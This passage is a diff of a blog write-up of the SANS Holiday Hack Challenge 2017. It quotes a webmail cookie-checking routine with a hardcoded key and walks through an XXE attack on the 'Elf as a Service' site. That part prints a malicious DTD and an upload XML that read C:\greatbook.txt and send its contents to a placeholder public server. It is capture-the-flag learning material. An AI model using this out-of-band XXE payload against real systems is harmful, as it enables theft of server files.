+</span><span style="color:#75715e"></span><span style="">        </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">plaintext</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#a6e22e">rando_string</span><span style="">(</span><span style="color:#ae81ff">5</span><span style="">)</span><span style="">
+</span><span style="">        </span><span style="color:#75715e">//makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
+</span><span style="color:#75715e"></span><span style="">        </span><span style="color:#75715e">//Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.
+</span><span style="color:#75715e"></span><span style="">        </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">ciphertext</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#a6e22e">aes256</span><span style="">.</span><span style="color:#a6e22e">encrypt</span><span style="">(</span><span style="color:#a6e22e">key</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">plaintext</span><span style="">).</span><span style="color:#a6e22e">replace</span><span style="">(</span><span style="color:#e6db74">/\=/g</span><span style="">,</span><span style="color:#e6db74">&#39;&#39;</span><span style="">);</span><span style="">
+</span><span style="">        </span><span style="color:#75715e">//Setting the values of the cookie.
+</span><span style="color:#75715e"></span><span style="">        </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">acookie</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="">[</span><span style="color:#e6db74">&#39;IOTECHWEBMAIL&#39;</span><span style="">,</span><span style="color:#a6e22e">JSON</span><span style="">.</span><span style="color:#a6e22e">stringify</span><span style="">({</span><span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">username</span><span style="">,</span><span style=""> </span><span style="color:#e6db74">&#34;plaintext&#34;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">plaintext</span><span style="">,</span><span style="">  </span><span style="color:#e6db74">&#34;ciphertext&#34;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">ciphertext</span><span style="">}),</span><span style=""> </span><span style="">{</span><span style=""> </span><span style="color:#a6e22e">maxAge</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#ae81ff">86400000</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">httpOnly</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#66d9ef">true</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">encode</span><span style="color:#f92672">:</span><span style=""> </span><span style="">String</span><span style=""> </span><span style="">}]</span><span style="">
+</span><span style="">        </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#a6e22e">callback</span><span style="">(</span><span style="color:#a6e22e">acookie</span><span style="">);</span><span style="">
+</span><span style="">    </span><span style="">};</span><span style="">
+</span><span style="">    </span><span style="color:#66d9ef">function</span><span style=""> </span><span style="color:#a6e22e">cookie_checker</span><span style="">(</span><span style="color:#a6e22e">req</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">callback</span><span style="">){</span><span style="">
+</span><span style="">        </span><span style="color:#66d9ef">try</span><span style="">{</span><span style="">
+</span><span style="">            </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">key</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74">&#39;need to put any length key in here&#39;</span><span style="">;</span><span style="">
+</span><span style="">            </span><span style="color:#75715e">//Retrieving the cookie from the request headers and parsing it as JSON
+</span><span style="color:#75715e"></span><span style="">            </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">thecookie</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#a6e22e">JSON</span><span style="">.</span><span style="color:#a6e22e">parse</span><span style="">(</span><span style="color:#a6e22e">req</span><span style="">.</span><span style="color:#a6e22e">cookies</span><span style="">.</span><span style="color:#a6e22e">IOTECHWEBMAIL</span><span style="">);</span><span style="">
+</span><span style="">            </span><span style="color:#75715e">//Retrieving the cipher text 
+</span><span style="color:#75715e"></span><span style="">            </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">ciphertext</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#a6e22e">thecookie</span><span style="">.</span><span style="color:#a6e22e">ciphertext</span><span style="">;</span><span style="">
+</span><span style="">            </span><span style="color:#75715e">//Retrievingin the username
+</span><span style="color:#75715e"></span><span style="">            </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">username</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#a6e22e">thecookie</span><span style="">.</span><span style="color:#a6e22e">name</span><span style="">
+</span><span style="">            </span><span style="color:#75715e">//retrieving the plaintext
+</span><span style="color:#75715e"></span><span style="">            </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">plaintext</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#a6e22e">aes256</span><span style="">.</span><span style="color:#a6e22e">decrypt</span><span style="">(</span><span style="color:#a6e22e">key</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">ciphertext</span><span style="">);</span><span style="">
+</span><span style="">            </span><span style="color:#75715e">//If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key
+</span><span style="color:#75715e"></span><span style="">            </span><span style="color:#66d9ef">if</span><span style=""> </span><span style="">(</span><span style="color:#a6e22e">plaintext</span><span style=""> </span><span style="color:#f92672">===</span><span style=""> </span><span style="color:#a6e22e">thecookie</span><span style="">.</span><span style="color:#a6e22e">plaintext</span><span style="">)</span><span style=""> </span><span style="">{</span><span style="">
+</span><span style="">                </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#a6e22e">callback</span><span style="">(</span><span style="color:#66d9ef">true</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">username</span><span style="">);</span><span style="">
+</span><span style="">            </span><span style="">}</span><span style=""> </span><span style="color:#66d9ef">else</span><span style=""> </span><span style="">{</span><span style="">
+</span><span style="">                </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#a6e22e">callback</span><span style="">(</span><span style="color:#66d9ef">false</span><span style="">,</span><span style=""> </span><span style="color:#e6db74">&#39;&#39;</span><span style="">);</span><span style="">
+</span><span style="">            </span><span style="">}</span><span style="">
+</span><span style="">        </span><span style="">}</span><span style=""> </span><span style="color:#66d9ef">catch</span><span style=""> </span><span style="">(</span><span style="color:#a6e22e">e</span><span style="">)</span><span style=""> </span><span style="">{</span><span style="">
+</span><span style="">            </span><span style="color:#a6e22e">console</span><span style="">.</span><span style="color:#a6e22e">log</span><span style="">(</span><span style="color:#a6e22e">e</span><span style="">);</span><span style="">
+</span><span style="">            </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#a6e22e">callback</span><span style="">(</span><span style="color:#66d9ef">false</span><span style="">,</span><span style=""> </span><span style="color:#e6db74">&#39;&#39;</span><span style="">);</span><span style="">
+</span><span style="">        </span><span style="">}</span><span style="">
+</span><span style="">    </span><span style="">};</span></code></pre>
+</div>
 <!-- 5. How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles? Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?
 
 Minty Candycane offers some tips for this challenge in the North Pole and Beyond. -->
@@ -638,6 +733,62 @@ Minty Candycane offers some tips for this challenge in the North Pole and Beyond
 <p><em>6. The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at <a href="http://eaas.northpolechristmastown.com">http://eaas.northpolechristmastown.com</a>. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?</em></p>
 
 <p><em>For hints on this challenge, please consult with Sugarplum Mary in the North Pole and Beyond.</em></p>
+
+<p>tl;dr:</p>
+
+<ul>
+<li>The title of the page is <code>The Dreaded Inter-dimensional Tornadoes</code>.</li>
+</ul>
+
+<p>For this part, I also needed to do a SSH tunnel to access the site from my localhost. Visiting the site, We are presented with a web application with the following functionalities:</p>
+
+<ul>
+<li>Upload and display an XML file with the corresponding fields: <a href="http://eaas.northpolechristmastown.com/Home/DisplayXML">http://eaas.northpolechristmastown.com/Home/DisplayXML</a></li>
+<li>Reset the XML file to the default one: <a href="http://eaas.northpolechristmastown.com/Home/CreateElfs">http://eaas.northpolechristmastown.com/Home/CreateElfs</a></li>
+<li>A sample XML file at: <a href="http://eaas.northpolechristmastown.com/XMLFile/Elfdata.xml">http://eaas.northpolechristmastown.com/XMLFile/Elfdata.xml</a></li>
+</ul>
+
+<p>Following the hints, I carried out a XXE with DTD exploit on the application. This time, I need a public IP address again so that the application is able to access the malicious DTD from my server. The setup goes as following:</p>
+
+<ol>
+<li><p>A malicious DTD is accessible on my public server:</p>
+
+<p><code>pwn.dtd</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">&lt;?xml </span><span style="">version</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span><span style=""> </span><span style="">encoding</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="">?&gt;
+</span><span style="">&lt;!ENTITY % stolendata SYSTEM </span><span style="color:#e6db74">&#34;file:///c:/greatbook.txt&#34;</span><span style="">&gt;
+</span><span style="">&lt;!ENTITY % inception </span><span style="color:#e6db74">&#34;&lt;!ENTITY % sendit SYSTEM &#39;http://&lt;public-ip-goes-here&gt;:8000/?%stolendata;&#39;&gt;&#34;</span><span style="">&gt;</span></code></pre>
+</div></li>
+
+<li><p>The malicious xml file to be uploaded to the application:</p>
+
+<p><code>elfdata.xml</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">&lt;?xml </span><span style="">version</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span><span style=""> </span><span style="">encoding</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="">?&gt;
+</span><span style="">&lt;!DOCTYPE demo </span><span style="color:#f92672">[</span><span style="">
+</span><span style="">    &lt;!ELEMENT demo ANY &gt;
+</span><span style="">    &lt;!ENTITY % extentity SYSTEM </span><span style="color:#e6db74">&#34;http://&lt;public-ip-goes-here&gt;:8000/pwn.dtd&#34;</span><span style="">&gt;
+</span><span style="">    %extentity</span><span style="">;</span><span style="">
+</span><span style="">    %inception</span><span style="">;</span><span style="">
+</span><span style="">    %sendit</span><span style="">;</span><span style="">
+</span><span style="">    </span><span style="color:#f92672">]</span><span style="">
+</span><span style="">&gt;
+</span><span style="">&lt;Elf&gt;
+</span><span style="">  &lt;Elf&gt;
+</span><span style="">      &lt;ElfID&gt;1&lt;/ElfID&gt;
+</span><span style="">      &lt;ElfName&gt;x64&lt;/ElfName&gt;
+</span><span style="">      &lt;Contact&gt;13371337&lt;/Contact&gt;
+</span><span style="">      &lt;DateOfPurchase&gt;11/29/3017 </span><span style="color:#ae81ff">12</span><span style="">:00:00 AM&lt;/DateOfPurchase&gt;
+</span><span style="">      &lt;Picture&gt;2.png&lt;/Picture&gt;
+</span><span style="">      &lt;Address&gt;here&lt;/Address&gt;
+</span><span style="">  &lt;/Elf&gt;
+</span><span style="">&lt;/Elf&gt;</span></code></pre>
+</div></li>
+</ol>
+
+<p>After uploading the malicious xml file to the application, I was able to see the content of <code>C:\greatbook.txt</code> in my web log on my server:</p>
+
+<p><img src="/img/sans-hhc17/p6-img1.jpg" alt="greatbook.txt" /></p>
+
+<p>Visit the URL to obtain page 6 of the great book!</p>
 
 <!-- 7. Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?
 
@@ -650,6 +801,24 @@ For hints on solving this challenge, please locate Wunorse Openslae in the North
 9. Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?
 
 To answer this question, you need to fetch at least five of the seven pages of The Great Book and complete the final level of the North Pole and Beyond. -->
+
+<p><a name="HHC17-learned"></a></p>
+
+<h1 id="things-i-ve-learned-in-this-challenge">Things I&rsquo;ve learned in this challenge</h1>
+
+<ol>
+<li>How to do SSH tunnel.</li>
+<li>XXE, DTD and how to do a simple XXE with DTD.</li>
+<li>Parsing data from the command line. This is a great one.</li>
+</ol>
+
+<p>And more importantly, the non-technical lessons</p>
+
+<ol>
+<li>Look carefully. Small but critial details are easy to overlook. I overlook many things: the hints for the correct nmap scan, the grep result for the password. They were all important and what I gotta pay for is time.</li>
+<li>Play with exploits to understand it.</li>
+<li><strong>NEVER HARDCODE YOUR PASSWORD, JUST DON&rsquo;T</strong></li>
+</ol>
 
 			</div>
 			<div id="meta-data">
